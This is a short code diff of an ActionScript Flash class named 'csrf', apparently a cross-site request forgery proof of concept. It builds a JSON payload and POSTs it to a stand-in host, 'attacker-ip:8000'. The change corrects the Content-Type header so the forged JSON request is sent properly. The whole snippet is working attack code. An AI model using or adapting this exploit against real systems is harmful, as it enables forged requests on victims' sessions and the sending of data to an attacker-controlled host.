@@ -22,7 +22,7 @@ public class csrf extends Sprite
       myJson = JSON.stringify(myData);
       var url:String = "http://attacker-ip:8000/";
       var request:URLRequest = new URLRequest(url);
-      request.requestHeaders.push(new URLRequestHeader("Content-  Type","application/json"));
+      request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));
       request.data = myJson;
       request.method = URLRequestMethod.POST;
       var urlLoader:URLLoader = new URLLoader();
